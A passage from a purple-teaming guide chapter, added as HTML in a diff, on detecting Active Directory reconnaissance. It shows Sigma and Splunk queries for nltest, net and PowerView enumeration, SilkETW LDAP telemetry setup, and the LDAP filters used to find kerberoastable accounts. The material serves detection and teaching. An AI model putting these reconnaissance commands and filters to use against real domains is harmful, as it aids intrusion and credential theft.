+    <span class="pi">-</span> <span class="s">Legitimate administration use but user and host must be investigated</span>
+<span class="na">level</span><span class="pi">:</span> <span class="s">medium</span>
+</code></pre></div></div>
+<p>A Splunk SPL query produced from the above Sigma rule, transformed using pySigma.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span> 
+<span class="nv">Image</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">nltest.exe</span><span class="p">"</span> <span class="nv">OR</span> <span class="nv">OriginalFileName</span><span class="o">=</span><span class="p">"</span><span class="s2">nltestrk.exe</span><span class="p">"</span>
+<span class="p">(</span><span class="nv">CommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">*server*</span><span class="p">"</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">*query*</span><span class="p">")</span> <span class="nv">OR</span> <span class="nv">CommandLine</span> <span class="nv">IN</span> <span class="p">("</span><span class="s2">*/user*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*all_trusts*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dclist:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dnsgetdc:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*domain_trusts*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dsgetdc:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*parentdomain*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*trusted_domains*</span><span class="p">")</span>
+</code></pre></div></div>
+<p>An equivalent query using process creation events with event ID 4688.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">EventID</span><span class="o">=</span><span class="mi">4688</span>
+<span class="nv">NewProcessName</span><span class="o">=*\\</span><span class="nv">nltest</span><span class="o">.</span><span class="nv">exe</span>
+<span class="p">(</span><span class="nv">CommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">*server*</span><span class="p">"</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">*query*</span><span class="p">")</span> <span class="nv">OR</span> <span class="nv">CommandLine</span> <span class="nv">IN</span> <span class="p">("</span><span class="s2">*/user*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*all_trusts*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dclist:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dnsgetdc:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*domain_trusts*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*dsgetdc:*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*parentdomain*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*trusted_domains*</span><span class="p">")</span>
+</code></pre></div></div>
+<h5 id="theshold-based-alerting">Theshold-Based Alerting</h5>
+<p>A threshold-based Splunk SPL query, looking for more than two enumeration commands performed on the same host in the lookback window.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span>
+<span class="p">(</span><span class="nv">Image</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">nltest.exe</span><span class="p">"</span> <span class="nv">AND</span> <span class="nv">CommandLine</span> <span class="nv">IN</span> <span class="p">("</span><span class="s2">*/dclist*</span><span class="p">",</span> <span class="p">"</span><span class="s2">*/domain_trusts*</span><span class="p">"))</span> <span class="nv">OR</span> <span class="p">(</span><span class="nv">Image</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">net*.exe</span><span class="p">"</span> <span class="nv">AND</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">*Domain Admins*</span><span class="p">")</span>
+<span class="o">|</span> <span class="nv">stats</span> <span class="nv">dc</span><span class="p">(</span><span class="nv">CommandLine</span><span class="p">)</span> <span class="nv">as</span> <span class="nv">distinct_commands</span> <span class="nv">by</span> <span class="nv">Computer</span>
+<span class="o">|</span> <span class="nv">where</span> <span class="nv">distinct_commands</span> <span class="o">&gt;</span> <span class="mi">2</span>
+</code></pre></div></div>
+<h5 id="suspicious-ldap-queries">Suspicious LDAP Queries</h5>
+<h6 id="configuring-silkservice">Configuring SilkService</h6>
+<p>The SilkService XML configuration, set to fetch LDAP queries from the <code class="language-plaintext highlighter-rouge">Microsoft-Windows-LDAP-Client</code> provider.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;SilkServiceConfig&gt;</span>
+  <span class="nt">&lt;ETWCollector&gt;</span>
+    <span class="nt">&lt;Guid&gt;</span>6a1e76fd-792b-412f-91ea-4b365de07bae<span class="nt">&lt;/Guid&gt;</span>
+    <span class="nt">&lt;CollectorType&gt;</span>user<span class="nt">&lt;/CollectorType&gt;</span>
+    <span class="nt">&lt;ProviderName&gt;</span>Microsoft-Windows-LDAP-Client<span class="nt">&lt;/ProviderName&gt;</span>
+    <span class="nt">&lt;OutputType&gt;</span>eventlog<span class="nt">&lt;/OutputType&gt;</span>
+  <span class="nt">&lt;/ETWCollector&gt;</span>
+<span class="nt">&lt;/SilkServiceConfig&gt;</span>
+</code></pre></div></div>
+<p>Commands to create and start the <i>SilkService</i> service.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\SilkService</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">SilkService</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Program Files\SilkService\SilkService.exe"</span><span class="w"> </span><span class="n">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span><span class="w">
+</span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\SilkService</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">SilkService</span><span class="w">
+</span></code></pre></div></div>
+<p>The command to open the LDAP query window using <code class="language-plaintext highlighter-rouge">dsquery</code>,</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; rundll32 dsquery,OpenQueryWindow
+</code></pre></div></div>
+<p>An LDAP query to execute in the query window.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nv">samAccountName</span><span class="o">=</span><span class="nv">Administrator</span><span class="p">)</span>
+</code></pre></div></div>
+<h6 id="forwaring-silkservice-events">Forwaring SilkService Events</h6>
+<p>The configuration for Splunk event forwarding created at <code class="language-plaintext highlighter-rouge">C:\Program Files\SplunkUniversalForwarder\etc\apps\silkservice_inputs_app\local\inputs.conf</code>.</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[WinEventLog://SilkService-Log]</span>
+<span class="py">disabled</span> <span class="p">=</span> <span class="s">false</span>
+<span class="py">renderXml</span> <span class="p">=</span> <span class="s">false</span>
+<span class="py">index</span> <span class="p">=</span> <span class="s">etw</span>
+<span class="py">source</span> <span class="p">=</span> <span class="s">XmlWinEventLog:SilkService-Log</span>
+</code></pre></div></div>
+<p>Commands to restart the <code class="language-plaintext highlighter-rouge">SplunkForwarder</code> service to load the above configuration.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">SplunkForwarder</span><span class="w">
+</span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">SplunkForwarder</span><span class="w">
+</span></code></pre></div></div>
+<p>A Splunk query to transform the SilkService logs and filter for the <code class="language-plaintext highlighter-rouge">Microsoft-Windows-LDAP-Client</code>.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">etw</span> 
+<span class="o">|</span> <span class="nv">spath</span> <span class="nv">input</span><span class="o">=</span><span class="nv">Message</span> 
+<span class="o">|</span> <span class="nb">rename</span> <span class="nv">XmlEventData</span><span class="o">.*</span> <span class="nv">as</span> <span class="o">*</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">ProviderName</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-LDAP-Client</span><span class="p">"</span>
+</code></pre></div></div>
+<h6 id="identifying-tool-specific-queries">Identifying Tool-Specific Queries</h6>
+<p>Splunk SPL query to identify usage of PowerView to find kerberoastable users via a specific LDAP search filter.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">etw</span> 
+<span class="o">|</span> <span class="nv">spath</span> <span class="nv">input</span><span class="o">=</span><span class="nv">Message</span> 
+<span class="o">|</span> <span class="nb">rename</span> <span class="nv">XmlEventData</span><span class="o">.*</span> <span class="nv">as</span> <span class="o">*</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">ProviderName</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-LDAP-Client</span><span class="p">"</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">SearchFilter</span><span class="o">=</span><span class="p">"</span><span class="s2">(&amp;(samAccountType=805306368)(servicePrincipalName=</span><span class="se">\</span><span class="s2">*))</span><span class="p">"</span>
+</code></pre></div></div>
+<p>A similar query for identifying discovery of Active Directory computers, again using PowerView.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">etw</span> 
+<span class="o">|</span> <span class="nv">spath</span> <span class="nv">input</span><span class="o">=</span><span class="nv">Message</span> 
+<span class="o">|</span> <span class="nb">rename</span> <span class="nv">XmlEventData</span><span class="o">.*</span> <span class="nv">as</span> <span class="o">*</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">ProviderName</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-LDAP-Client</span><span class="p">"</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">SearchFilter</span><span class="o">=</span> <span class="p">"</span><span class="s2">(&amp;(samAccountType=805306369)(operatingsystem=*server*))</span><span class="p">"</span>
+</code></pre></div></div>
+<hr />
+<h2 id="resources">Resources</h2>
+<p>The following resources expand on topics covered in this chapter.
+<br />
+<br /></p>
+<h4 id="the-scenario">The Scenario</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The translated Conti playbook showing Active Directory reconnaissance using LOLBAS and PowerView</h6>
+               <p><i>"Conti-Leaked-Playbook-TTPs," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/DISREL/Conti-Leaked-Playbook-TTPs/blob/main/Conti-Leaked-Playbook-TTPs.pdf" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="selecting-abilities-1">Selecting Abilities</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The YAML definition for the Identify active user ability provided by the Stockpile plugin</h6>
+               <p><i>"c0da588f-79f0-4263-8998-7496b1a40596," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Caldera has a feature-rich API that can be leveraged to automate the creation of abilities, adversaries and operations. This is an example of this end-to-end process</h6>
+               <p><i>"pyCaldera," accessed November 3, 2024</i></p>
+                <a target="_blank" href="https://github.com/ajpc500/pyCaldera/blob/main/notebook.ipynb" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The Compass plugin for Caldera provides a built-in ATT&amp;CK Navigator and enables adversary profiles to be converted into Navigator layers and, going the other way, enables Navigator layers to be converted into adversary profiles (where the abilities exist)</h6>
+               <p><i>"Compass," GitHub, accessed November 2, 2024</i></p>
+                <a target="_blank" href="https://github.com/mitre/compass" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="working-with-facts-1">Working with Facts</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Fact parsers provided by the Stockpile plugin, including one for Mimikatz output</h6>
+               <p><i>"parsers," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/mitre/stockpile/tree/master/app/parsers" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The YAML definition for the Impersonate user ability that makes use of relationships between facts to operationalize username and password combinations</h6>
+               <p><i>"3796a00b-b11d-4731-b4ca-275a07d83299," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/data/abilities/execution/3796a00b-b11d-4731-b4ca-275a07d83299.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="obfuscating-execution">Obfuscating Execution</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Base64 obfuscator provided by the Stockpile plugin, used to modify executed abilities</h6>
+               <p><i>"base64_basic.py," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/mitre/stockpile/blob/f45c06b39d0aa7bdde2f01830bfa5c06d2353923/app/obfuscators/base64_basic.py" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="command-line-arguments-1">Command Line Arguments</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A Sigma rule for detecting Active Directory reconnaissance using nltest</h6>
+               <p><i>"process_creation/proc_creation_win_nltest_recon.yml," GitHub, accessed November 3, 2024</i></p>
+                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/9bbd096e47540d9cf0be7150278754ae5ece39ed/rules/windows/process_creation/proc_creation_win_nltest_recon.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="suspicious-ldap-queries-1">Suspicious LDAP Queries</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A section of the PowerView script that constructs the LDAP search filter for kerberoastable users</h6>
+               <p><i>"PowerView.ps1," accessed November 3, 2024</i></p>
+                <a target="_blank" href="https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1#L5206-L5209" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A walkthrough by Riccardo Ancarani on use of SilkETW to detect suspicious LDAP queries with ETW telemetry</h6>
+               <p><i>Riccardo Ancarani, "Hunting for Suspicious LDAP Activity with SilkETW and Yara," October 19, 2019</i></p>
+                <a target="_blank" href="https://riccardoancarani.github.io/2019-10-19-hunting-for-domain-enumeration/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A snippet from the Rubeus code base that includes the construction of an LDAP search filter for the purposes of identifying kerberoastable users</h6>
+               <p><i>"Roast.cs," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/GhostPack/Rubeus/blob/b98d898217106decf5c06d13be9ffec2ff93c5e7/Rubeus/lib/Roast.cs#L457-L538" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A snippet from the GetUserSPNs.py script that includes a similar code section for constructing an LDAP search for kerberoastable users</h6>
+               <p><i>"GetUsersSPNs.py," accessed May 27, 2024</i></p>
+                <a target="_blank" href="https://github.com/fortra/impacket/blob/15eff8805116007cfb59332a64194a5b9c8bcf25/examples/GetUserSPNs.py#L297-L304" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A blog from Dom Chell on the red team perspective to Active Directory enumeration, including alternative sources of LDAP telemetry, defensive use cases and subsequent evasions</h6>
+               <p><i>Dom Chell, "Active Directory Enumeration for Red Teams," MDSec, Feb, 2024</i></p>
+                <a target="_blank" href="https://www.mdsec.co.uk/2024/02/active-directory-enumeration-for-red-teams/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<div class="container">
+ <div class="row">
+   <div class="col" style="text-align: left">
+      <a href="/part-II/lotl-with-atomic-red-team/" class="btn btn-primary">&lt;&lt; Chapter 8</a>
+   </div>
+   <div class="col" style="text-align: right">
+      <a href="/part-II/domain-compromise-with-mythic/" class="btn btn-primary">Chapter 10 &gt;&gt;</a>
+   </div>
+ </div>
+</div>
+			</article>
+		</div>
+	</main>
+		<!-- Footer -->
+ <footer class="footer-chulapa text-center mt-0 pt-3">
+   <div class="container">
+     <div class="row">
+       <div class="col-xl-10 offset-xl-1"><div role="navigation" class="d-flex flex-wrap justify-content-center"><a href="https://github.com/orgs/aguidetopurpleteaming" title="footerRepo on Github" class="chulapa-footer-sociallink lead"><span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span><span class="sr-only">Repo on Github</span>
+            </a></div><p class="mt-2 mb-3">&copy; 2025 ajpc500</p>
+          <!-- Do not remove this in order to give  attributions -->
+         <p class="chulapa-footer-brand">Powered by <a href="https://dieghernan.github.io/chulapa"> <span class="chulapa">Chulapa</span> Jekyll Theme</a><br><b>Lux</b> skin by <a href="https://bootswatch.com/">Bootswatch</a></p>
+          <!-- End  attributions -->
+       </div>
+     </div>
+ </div>
+</footer>
+<!-- Footer -->
+<!-- JS, Popper.js, and jQuery -->
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js"></script>
+	<!-- start custom scripts to be placed at the bottom of the page -->
+<!-- end custom bottom scripts -->
+	</body>
+</html>
